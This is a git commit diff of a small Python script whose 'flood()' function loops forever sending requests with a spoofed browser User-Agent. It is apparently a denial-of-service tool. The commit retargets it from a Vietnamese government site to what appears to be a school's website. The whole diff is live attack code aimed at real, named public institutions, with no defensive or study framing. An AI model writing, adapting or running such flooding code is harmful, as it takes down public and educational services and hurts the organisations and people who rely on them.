ebd7d54f98f171839a3ff56c34cb7c0fbe28c291
taphuocgg2kxyz <taphuocgg2k.xyz@gmail.com>
2026-08-23 21:31:19 +0700

    Update 1.py

--- 1.py
+++ 1.py
@@ -2,7 +2,7 @@ import requests
 import threading
 
 def flood():
-    url = "http://online.gov.vn"
+    url = "https://thcscaugiay.edu.vn"
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
     while True:
         try:
